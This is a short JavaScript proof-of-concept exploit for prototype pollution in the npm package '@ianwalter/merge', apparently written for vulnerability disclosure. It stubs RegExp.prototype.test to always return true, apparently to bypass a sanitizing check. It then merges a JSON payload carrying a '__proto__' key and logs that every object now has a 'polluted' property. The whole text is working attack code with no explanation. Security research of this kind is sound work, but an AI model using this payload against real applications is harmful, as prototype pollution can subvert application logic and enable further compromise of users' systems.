RegExp.prototype.test = () => true;
const merge = require('@ianwalter/merge');
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
merge({}, EVIL_JSON);
console.log({}.polluted);